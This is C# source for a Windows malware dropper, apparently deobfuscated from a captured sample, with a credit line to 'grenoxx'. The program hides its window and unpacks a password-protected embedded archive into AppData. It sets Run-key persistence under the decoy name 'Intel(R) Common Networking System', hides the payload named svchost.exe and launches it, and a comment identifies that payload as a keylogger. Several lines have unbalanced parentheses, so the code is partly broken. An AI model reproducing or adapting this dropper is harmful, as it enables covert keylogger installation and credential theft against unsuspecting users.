// Deobfuscated by: grenoxx

using ICSharpCode.SharpZipLib.Zip;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Setup.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace Setup
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 9);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.ShowInTaskbar = false;
      this.Opacity = 0.0;
      try
      {
        string userApplicationData = MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData;
        if (!this.FileExists(userApplicationData +  "/server.zip"))
          MyProject.Computer.FileSystem.WriteAllBytes(userApplicationData + "/server.zip", Setup.My.Resources.Resources.svchost, true);
        Form1.ExtractFiles(userApplicationData +  "/server.zip", userApplicationData, "abc123456");
        if (this.FileExists(userApplicationData + "/svchost.exe")
          this.Record(userApplicationData + "/svchost.exe")));
        if (this.FileExists(userApplicationData + "/server.zip"))
          File.Delete(userApplicationData + "/server.zip");
        Process.Start(userApplicationData + "/svchost.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().Kill();
    }

    public bool FileExists(string str) => File.Exists(str);

    public void Record(string str)
    {
      // Keylogger peristence = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
      // Record: Intel(R) Common Networking System
      
      RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Versioned.CallByName((object) MyProject.Computer, "Registry", CallType.Get))), "SetValue", CallType.Method, (object) "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"), (object) "Intel(R) Common Networking System"), (object) str));
      File.SetAttributes(str, FileAttributes.Hidden);
    }

    public static void ExtractFiles(
      string ExtFl,
      string ZpFl,
      string LkdF)
    {
      FastZip fastZip = new FastZip(new FastZipEvents());
      fastZip.set_CreateEmptyDirectories(true);
      if (!string.IsNullOrEmpty(LkdF))
        fastZip.set_Password(LkdF);
      fastZip.set_UseZip64((UseZip64) 1);
      fastZip.set_RestoreAttributesOnExtract(true);
      fastZip.set_RestoreDateTimeOnExtract(true);
      fastZip.ExtractZip(ExtFl, ZpFl, (FastZip.Overwrite) 2, (FastZip.ConfirmOverwriteDelegate) null, "", "", true);
    }

    public string nnnnnnnnnnnnnnnnnnnnnnnnnnnn(string input) => Encoding.UTF8.GetString(Convert.FromBase64String(input));
  }
}
